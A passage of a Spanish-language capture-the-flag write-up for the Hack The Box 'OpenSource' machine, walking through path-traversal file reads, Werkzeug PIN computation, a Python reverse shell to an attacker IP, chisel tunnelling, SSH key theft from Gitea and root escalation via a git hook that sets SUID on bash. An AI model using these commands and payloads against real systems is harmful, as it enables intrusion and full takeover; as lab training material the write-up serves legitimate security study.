No servirá de nada ir a la redirección, por lo que vamos a probar si agregamos el clásico `../`, para probar si se aplica el **LFI**.

Pruébalo y ve el resultado:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura21.png">
</p>

Nos manda al **information leakage** del **path**.

Ahora, probemos agregándole la diagonal que le falta y observamos el resultado:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura22.png">
</p>

Excelente, entonces es posible aplicar **LFI** contra la página web.

También podemos aplicarlo con **curl**, agregando el parámetro `--path-as-is`:
```bash
curl --path-as-is http://10.10.11.164/uploads/..//etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```
Este parámetro sirve para ignorar la cabecera **Content-Length** y poder ver archivos de más de 2 GB.

### Ganando Acceso a la Consola de Flask Copiando el Proceso de Generación de PIN de Werkzeug {#pin}

Esa consola que encontramos al aplicar **Fuzzing**, resulta ser un **debugger de Flask**.

Existe una forma en la que podemos obtener ese **PIN** que nos pide; la puedes encontrar en **HackTricks**:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit" target="_blank">HackTricks: werkzeug</a>

La idea, es ocupar un script que nos permita obtener un **PIN válido** para ganar acceso a esa consola.

Este script necesita ciertos datos que, en caso de poder aplicar **LFI**, podemos obtener, aunque algunos ya los tenemos.

Necesita datos públicos y privados.

Datos públicos:
* *Username*: que ya vimos que el root es quien ejecuta el docker/servidor.
* *modname*: que ya esta establecido como *flask.app*.
* *getattr(app, '__name__', getattr(app.__class__, '__name__'))*: ya esta establecido como **Flask**.
* *getattr(mod, '__file__', None)*: este representa la ruta completa a **app.py** dentro del directorio **Flask**, por ejemplo, **/usr/local/lib/python3.5/dist-packages/flask/app.py**. Este lo podemos obtener si buscamos un archivo no existente dentro de los archivos cargados, por ejemplo, trata de buscar el **archivo test2.txt o test3.txt** y observa el resultado:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura23.png">
</p>

Ahí esta la ruta completa del script **app.py**.

Datos privados:
* *uuid.getnode()*: este representa la **MAC** de la máquina víctima; debe estar en hexadecimal. Para obtener este, podemos aplicar un **curl** a la siguiente ruta: `/sys/class/net/<device_id>/address`, en donde debemos especificar la interfaz de red de la máquina.
```bash
curl --path-as-is http://10.10.11.164/uploads/..//sys/class/net/eth0/address
02:42:ac:11:00:07
curl: (18) end of response with 4078 bytes missing
```
Al ser un contenedor, estos tienen la interfaz **eth0** por defecto.

Ahora, podemos pasar la **MAC** a hexadecimal usando **Python**. Elimina los `:` y pega el resultado en **Python**:
```python
python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0242ac110007
2485377892359
```

* *get_machine_id()*: se concatena la data de `/etc/machine-id`, o en caso de que no exista `/proc/sys/kernel/random/boot_id`, con el hash después de la diagonal de la data resultante de `/proc/self/cgroup`.

Para obtener el primer dato, agregamos el parámetro `--ignore-content-length`, pues así no trata las secuencias de `/../` o `/./` en la **ruta URL** dada. Normalmente, **curl** las aplasta o fusiona de acuerdo con los estándares, pero con esta opción puedes decirle que no lo haga.
```bash
curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id
ec9352f3-f38c-4d69-ad41-55fe71f295ba
```

Para el segundo dato, aplicamos lo mismo para la ruta que nos mencionan:
```bash
curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//proc/self/cgroup
12:cpuset:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
11:pids:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
10:hugetlb:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
9:freezer:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
8:net_cls,net_prio:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
7:blkio:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
6:cpu,cpuacct:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
5:perf_event:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
4:memory:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
3:rdma:/
2:devices:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
1:name=systemd:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
0::/system.slice/snap.docker.dockerd.service
```
Y ocupamos únicamente el **hash**, todos son iguales, por lo que puedes ocupar el que sea.

Después de recopilar toda esta información, nuestro script quedaría de esta manera:
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892359',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ec9352f3-f38c-4d69-ad41-55fe71f295ba13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799'  # get_machine_id(), /etc/machine-id
]
```

Ejecuta el script, deberías obtener un número que sería el **PIN** que para entrar a la consola interactiva:
```bash
python PIN_discover.py
135-767-720
```

Copia el **PIN** e intenta entrar a la consola:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura24.png">
</p>

Hemos ganado acceso a la consola, ya solo es cuestión de obtener una **shell**.

Abre una **netcat** y aplica la siguiente **Reverse Shell**:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tu_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Observa el resultado:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.164] 35636
/app # whoami  
whoami
root
```
Haz un tratamiento de la **TTY** y continua.

### Enumeración de Contenedor Docker y Utilizando Chisel {#docker}

Primero, veamos la IP del contenedor:
```bash
/app # ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2254 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2525 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:193956 (189.4 KiB)  TX bytes:3672127 (3.5 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

Veamos la tabla de enrutamiento:
```bash
/app # ip route
ip route
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 scope link  src 172.17.0.7
```
Parece que no estamos en la interfaz principal.

Probemos si podemos alcanzar la interfaz principal:
```bash
/app # ping -c 4 172.17.0.1
ping -c 4 172.17.0.1
PING 172.17.0.1 (172.17.0.1): 56 data bytes
64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.123 ms
64 bytes from 172.17.0.1: seq=1 ttl=64 time=0.114 ms
64 bytes from 172.17.0.1: seq=2 ttl=64 time=0.181 ms
64 bytes from 172.17.0.1: seq=3 ttl=64 time=0.122 ms

--- 172.17.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
```
Sí lo alcanzamos.

Cómo no tenemos **nmap**, podemos realizar un escaneo de puertos utilizando **netcat** dentro de un script de **bash**. 

Lo pondremos como un **oneline**r:
```bash
/app # for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done
for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; do
ne
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
172.17.0.1 (172.17.0.1:6004) open
172.17.0.1 (172.17.0.1:6005) open
172.17.0.1 (172.17.0.1:6006) open
172.17.0.1 (172.17.0.1:6007) open
```
Parece que el **puerto 3000** está almacenando algo.

Usemos **wget** para ver qué es:
```bash
/app # wget -qO- http://172.17.0.1:3000
wget -qO- http://172.17.0.1:3000
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2
...
...
...
```
Es una página llamada **Gitea**; investiguemos que es:

| **Gitea Software** |
|:-----------:|
| *Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git, así como otras funciones de colaboración como el seguimiento de errores y los wikis.* |

Entonces puede que aquí sirva la contraseña que encontramos al enumerar el **repositorio local de git**.

Necesitamos ver la página y para lograr esto, utilizaremos la herramienta **chisel**.

Descargala de aquí:
* <a href="https://github.com/jpillora/chisel/releases" target="_blank">Repositorio de jpillora: chisel - releases</a>

Una vez que la descargues, descomprimerlo con **gunzip**:
```bash
gunzip chisel_1.10.1_linux_amd64.gz

mv chisel_1.10.1_linux_amd64 chisel

chmod +x chisel
```

Ahora envíala al contenedor:

* Abre un servidor en **Python**:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* En el contenedor, muevete al **directorio /tmp** y descarga **chisel**:
```bash
/tmp # wget http://Tu_IP:8000/chisel
wget http://Tu_IP:8000/chisel
Connecting to Tu_IP:8000 (Tu_IP:8000)
saving to 'chisel'
chisel               100% |********************************| 9152k  0:00:00 ETA
'chisel' saved
```

Excelente, para que funcione **chisel** debemos abrir un servidor y un cliente, siendo que nuestra máquina será el servidor y el contenedor el cliente.

Quedaría de esta forma:

* Nuestra máquina como servidor usando el **puerto 1234**:
```bash
./chisel server --reverse -p 1234
2024/10/08 01:04:31 server: Reverse tunnelling enabled
2024/10/08 01:04:31 server: Fingerprint +775...
2024/10/08 01:04:31 server: Listening on http://0.0.0.0:1234
```

* Contenedor como cliente, aplicando **port forwarding** hacia nuestro **puerto 3000**:
```bash
/tmp # ./chisel client Tu_IP:1234 R:3000:172.17.0.1:3000
./chisel client Tu_IP:1234 R:3000:172.17.0.1:3000
2024/10/08 07:05:21 client: Connecting to ws://Tu_IP:1234
2024/10/08 07:05:22 client: Connected (Latency 161.096577ms)
```

* Comprueba si ya está funcionando nuestro **puerto 3000**:
```bash
lsof -i:3000
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
chisel  311354 root    7u  IPv6 1075283      0t0  TCP *:3000 (LISTEN)
```

Una vez realizado esto, podemos entrar desde el navegador al **localhost** al puerto 3000 para ver la página de **Gitea**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura25.png">
</p>

### Obteniendo Llave Privada y Entrando a Servicio SSH {#ssh}

Muy bien, hay una opción para iniciar sesión. Entra ahí y mete el usuario y contraseña que encontramos en el **repositorio de git**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura26.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura27.png">
</p>

Bien, vemos que se creó un repositorio que, al parecer, es un **backup** de algo. Entremos y veamos de que se trata:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura28.png">
</p>

Observa, hay un directorio de **SSH**, donde normalmente se almacenan las llaves para entrar.

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura29.png">
</p>

Tenemos la llave privada para entrar al **servicio SSH**.

Vamos a copiarla y a prepararla para entrar a este servicio:
```bash
nano id_rsa

chmod 600 id_rsa
```

Y probemosla:
```bash
ssh -i id.rsa dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
...
...
...
dev01@opensource:~$ whoami
dev01
```

Ya solo busca la flag del usuario:
```bash
dev01@opensource:~$ ls
user.txt
dev01@opensource:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de Servicio SSH {#enum}

Vamos a ver qué permisos tenemos:
```bash
dev01@opensource:/$ sudo -l
[sudo] password for dev01: 
Sorry, user dev01 may not run sudo on opensource.
```
No tenemos **permisos SUDO**.

Ahora a qué grupos pertenecemos:
```bash
dev01@opensource:/$ id
uid=1000(dev01) gid=1000(dev01) groups=1000(dev01)
```
Nada útil.

Por curiosidad, veamos la versión del SO:
```bash
dev01@opensource:/$ uname -a
Linux opensource 4.15.0-176-generic #185-Ubuntu SMP Tue Mar 29 17:40:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Veamos si hay algún binario al que tengamos acceso:
```bash
dev01@opensource:/$ find / -perm -4000 2>/dev/null -ls
      133    121 -rwsr-xr-x   1 root     root       123464 Mar  3  2022 /snap/snapd/15177/usr/lib/snapd/snap-confine
      135    121 -rwsr-xr-x   1 root     root       123560 Apr  8  2022 /snap/snapd/15534/usr/lib/snapd/snap-confine
       56     43 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /snap/core18/2344/bin/mount
       65     63 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /snap/core18/2344/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2022 /snap/core18/2344/bin/su
       99     27 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /snap/core18/2344/bin/umount
     1721     75 -rwsr-xr-x   1 root     root        76496 Jan 25  2022 /snap/core18/2344/usr/bin/chfn
     1723     44 -rwsr-xr-x   1 root     root        44528 Jan 25  2022 /snap/core18/2344/usr/bin/chsh
     1776     75 -rwsr-xr-x   1 root     root        75824 Jan 25  2022 /snap/core18/2344/usr/bin/gpasswd
     1840     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2022 /snap/core18/2344/usr/bin/newgrp
     1853     59 -rwsr-xr-x   1 root     root        59640 Jan 25  2022 /snap/core18/2344/usr/bin/passwd
     1944    146 -rwsr-xr-x   1 root     root       149080 Jan 19  2021 /snap/core18/2344/usr/bin/sudo
     2032     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2342    427 -rwsr-xr-x   1 root     root              436552 Mar  3  2020 /snap/core18/2344/usr/lib/openssh/ssh-keysign
     3487     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
     9846     28 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /bin/umount
     9845     44 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /bin/mount
     9830     44 -rwsr-xr-x   1 root     root               44664 Jan 25  2022 /bin/su
     4102     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
     5877    128 -rwsr-xr-x   1 root     root              130200 Feb 23  2022 /usr/lib/snapd/snap-confine
     1073     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     7423    100 -rwsr-xr-x   1 root     root              100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    23998     44 -rwsr-xr--   1 root     messagebus         42992 May  6  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     7512     16 -rwsr-xr-x   1 root     root               14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    18252    428 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /usr/lib/openssh/ssh-keysign
     6897     60 -rwsr-xr-x   1 root     root               59640 Jan 25  2022 /usr/bin/passwd
      881     20 -rwsr-xr-x   1 root     root               18448 Jun 28  2019 /usr/bin/traceroute6.iputils
     7259     40 -rwsr-xr-x   1 root     root               40344 Jan 25  2022 /usr/bin/newgrp
     5703     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2022 /usr/bin/newuidmap
     5699     44 -rwsr-xr-x   1 root     root               44528 Jan 25  2022 /usr/bin/chsh
      447     52 -rwsr-sr-x   1 daemon   daemon             51464 Feb 20  2018 /usr/bin/at
     6896     76 -rwsr-xr-x   1 root     root               75824 Jan 25  2022 /usr/bin/gpasswd
     1241     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2022 /usr/bin/newgidmap
      693    148 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /usr/bin/sudo
      718     76 -rwsr-xr-x   1 root     root               76496 Jan 25  2022 /usr/bin/chfn
```
Nada que podamos usar.

Lo que nos faltaría es ver si hay alguna **tarea CRON** ejecutándose. Esto lo revisaremos con **pspy**.

Descárgalo aquí:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>

Abre un servidor de **Python** y descárgalo en la máquina víctima:
```bash
dev01@opensource:/tmp$ wget http://Tu_IP/pspy64
--2024-10-08 20:41:48--  http://Tu_IP/pspy64
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64    100%[==================>]   2.96M   430KB/s    in 7.2s    

2024-10-08 20:41:56 (420 KB/s) - ‘pspy64’ saved [3104768/3104768]
```

Y ejecutemos el **pspy**:
```bash
dev01@opensource:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░

2024/10/08 20:45:01 CMD: UID=0     PID=11414  | /bin/bash /usr/local/bin/git-sync 
2024/10/08 20:45:01 CMD: UID=0     PID=11413  | /bin/sh -c /usr/local/bin/git-sync 
2024/10/08 20:45:01 CMD: UID=0     PID=11412  | /usr/sbin/CRON -f 
2024/10/08 20:45:01 CMD: UID=0     PID=11415  | git status --porcelain 
2024/10/08 20:45:01 CMD: UID=0     PID=11416  | /bin/bash /usr/local/bin/git-sync 
2024/10/08 20:45:01 CMD: UID=0     PID=11417  | git add . 
2024/10/08 20:45:01 CMD: UID=0     PID=11419  | /bin/bash /usr/local/bin/git-sync 
2024/10/08 20:45:01 CMD: UID=0     PID=11420  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2024/10/08 20:45:01 CMD: UID=0     PID=11421  | 
2024/10/08 20:46:01 CMD: UID=0     PID=11426  | /usr/sbin/CRON -f 
2024/10/08 20:46:01 CMD: UID=0     PID=11425  | /usr/sbin/CRON -f 
2024/10/08 20:46:01 CMD: UID=0     PID=11424  | /usr/sbin/CRON -f 
2024/10/08 20:46:01 CMD: UID=0     PID=11423  | /usr/sbin/CRON -f 
2024/10/08 20:46:01 CMD: UID=0     PID=11430  | /bin/sh -c /usr/local/bin/git-sync
```

Hay un script que se está ejecutando cada cierto tiempo y después se agrega al repositorio y se sube.

Veamos de que se trata:
```bash
dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```
Parece que hay un repositorio de **Git** en el directorio **/home** de este usuario, en donde se revisa si hay cambios y, si los hay, agrega esos cambios y los sube a su repositorio como un backup.

Veamos ese repositorio.

### Abusando de Git Hooks para Escalar Privilegios {#hooks}

Entrando al repositorio, encontramos esto:
```bash
dev01@opensource:~/.git$ ls -la
total 56
drwxrwxr-x  8 dev01 dev01 4096 Oct  8 21:24 .
drwxr-xr-x  7 dev01 dev01 4096 May 16  2022 ..
drwxrwxr-x  2 dev01 dev01 4096 May  4  2022 branches
-rw-r--r--  1 dev01 dev01   22 Oct  8 21:24 COMMIT_EDITMSG
-rw-rw-r--  1 dev01 dev01  269 Oct  8 21:24 config
-rw-rw-r--  1 dev01 dev01   73 Mar 23  2022 description
-rw-rw-r--  1 dev01 dev01  117 Mar 23  2022 FETCH_HEAD
-rw-r--r--  1 dev01 dev01   21 May 16  2022 HEAD
drwxrwxr-x  2 dev01 dev01 4096 May  4  2022 hooks
-rw-r--r--  1 root  root   845 Oct  8 20:26 index
drwxrwxr-x  2 dev01 dev01 4096 May  4  2022 info
drwxr-xr-x  3 dev01 dev01 4096 May  4  2022 logs
drwxrwxr-x 44 dev01 dev01 4096 Oct  8 20:26 objects
drwxrwxr-x  5 dev01 dev01 4096 May  4  2022 refs
```
Hay un directorio **hooks**. Investiguemos a que pertenece.

| **Git Hooks** |
|:-----------:|
| *Los hooks de Git son scripts que se ejecutan automáticamente cada vez que se produce un evento concreto en un repositorio de Git. Permiten personalizar el comportamiento interno de Git y desencadenar acciones personalizables en puntos clave del ciclo de vida del desarrollo.*

Resulta que hay una forma de abusar de estos, la puedes encontrar aquí: <a href="https://gtfobins.github.io/gtfobins/git/" target="_blank">GTFOBins: git</a>

Vamos a crear un hook que cambie los permisos de la **Bash**:
```bash
dev01@opensource:~/.git/hooks$ echo 'chmod u+s /bin/bash' > "pre-commit"
```

Revisa los permisos de la **Bash**:
```bash
dev01@opensource:~/.git/hooks$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

Dale permisos de ejecución al hook:
```bash
dev01@opensource:~/.git/hooks$ chmod +x pre-commit
```

Ahora, revisa si cambiaron los permisos de la **Bash**:
```bash
dev01@opensource:~/.git/hooks$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

Excelente, ya solo entramos a la **Bash** y obtenemos la flag:
```bash
dev01@opensource:/$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
config  meta  root.txt  snap
bash-4.4# cat root.txt
...
```

Hemos terminado la máquina.
